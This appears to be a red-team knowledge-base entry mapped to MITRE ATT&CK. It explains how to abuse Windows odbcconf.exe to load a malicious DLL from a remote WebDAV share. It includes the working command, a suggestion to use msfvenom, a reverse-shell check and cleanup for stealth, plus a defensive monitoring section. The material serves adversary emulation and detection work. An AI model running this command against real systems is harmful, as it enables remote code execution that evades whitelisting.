---
id: 3e03382e-11c3-4a66-b085-7ae7f93192fe
name: Windows-ODBC-Driver-Registration-via-Odbcconf
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:26.976699+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - '[[techniques/Masquerading|T1036 - Masquerading]]'
  - >-
    [[techniques/Signed Binary Proxy Execution|T1218 - Signed Binary Proxy
    Execution]]
sub_techniques: []
tags:
  - '[[tags/Odbcconf]]'
  - '[[tags/Windows - Download and execute methods]]'
commands:
  - '[[commands/odbcconf-register-remote-driver]]'
platforms:
  - Windows
tools: []
validated: true
---

# Windows-ODBC-Driver-Registration-via-Odbcconf

## Summary

This procedure uses the legitimate Windows Odbcconf.exe tool to register a malicious ODBC driver from a remote location, such as a WebDAV share, thereby executing arbitrary code while evading detection through the abuse of a signed system binary.

## Description

Odbcconf.exe is a built-in Windows utility for managing Open Database Connectivity (ODBC) drivers and data sources. Attackers can abuse this tool to register a custom DLL as an ODBC driver, which triggers the loading and execution of the DLL's code via the {regsvr} action. By hosting the malicious DLL on a remote share (e.g., WebDAV or SMB), the technique allows for remote code execution without directly downloading the payload to disk, reducing forensic footprints. This is particularly effective against environments with application whitelisting, as Odbcconf.exe is a trusted, signed Microsoft binary. The procedure is suitable for post-compromise scenarios where an attacker has command-line access to a Windows host and can reach a controlled remote server. Success results in the execution of the DLL's payload, potentially enabling persistence, data exfiltration, or further lateral movement.

## Requirements

1. Command-line access (e.g., via PowerShell, CMD, or remote shell) on a Windows system (Windows 7 or later).
2. Network access to a remote share (e.g., WebDAV or SMB) hosting the malicious DLL.
3. A pre-built malicious DLL that implements the ODBC driver interface and contains the desired payload (e.g., reverse shell or beacon).
4. Administrative privileges may be required for system-wide registration, though user-level registration is possible in some cases.

## Defense

- Monitor command-line invocations of Odbcconf.exe, especially with {regsvr} actions or remote paths, using process auditing (Event ID 4688) or EDR tools.
- Implement application whitelisting (e.g., AppLocker or WDAC) to restrict Odbcconf.exe usage or parameter validation.
- Block or monitor outbound connections to unusual remote shares from security tools like Windows Defender or Sysmon.
- Regularly audit registered ODBC drivers via the ODBC Data Source Administrator or registry keys under HKLM\SOFTWARE\ODBC\ODBCINST.INI.

## Objectives

1. Register a malicious DLL as an ODBC driver using Odbcconf.exe to trigger remote code execution.
2. Evade detection by leveraging a signed system binary and avoiding local file drops.
3. Establish execution of arbitrary payload for further post-exploitation activities.

## Instructions

### Step 1: Prepare the Remote Malicious DLL

**Context**: Before execution, ensure the malicious DLL is hosted on an accessible remote share. The DLL must export the necessary ODBC driver functions (e.g., SQLInstallDriverEx) to masquerade as a valid driver while executing the payload in its DllMain or entry points. Use a tool like msfvenom to generate the DLL payload.

No specific command here; this is a prerequisite setup on the attacker's controlled server (e.g., configure WebDAV with the DLL named payload.dll).

> Expected: The DLL is accessible via UNC path (e.g., \\webdavserver\share\payload.dll). Test connectivity from the target using `dir \\webdavserver\share`.

### Step 2: Register the Remote Driver

**Context**: Invoke Odbcconf.exe to add the remote DLL as a system-wide ODBC driver. The /s flag ensures silent operation, /a adds the driver, and {regsvr <path>} registers it, causing Windows to load the DLL remotely.

**Command** ([[commands/odbcconf-register-remote-driver]]):
```powershell
odbcconf /s /a {regsvr \\webdavserver\share\payload.dll}
```

> This command registers the specified DLL as an ODBC driver, triggering its execution. Replace the UNC path with your actual remote share and DLL name. Run from an elevated prompt if system-wide access is needed.

### Step 3: Verify Execution and Cleanup

**Context**: Confirm the payload executed (e.g., via a reverse shell callback) and optionally remove the driver to maintain stealth.

Use monitoring tools on the attacker side to check for payload activation. To unregister, use Odbcconf.exe with /a {regsvr <path>} but with removal flags, or manually edit the registry.

**Expected Output**: No console output if successful (silent flag); payload executes in the background. Check Event Viewer for ODBC-related events or network callbacks for confirmation.

> If the DLL loads successfully, you should see evidence of payload execution (e.g., incoming connection). Failure may result in error code 0x80004005 (access denied) if privileges are insufficient.
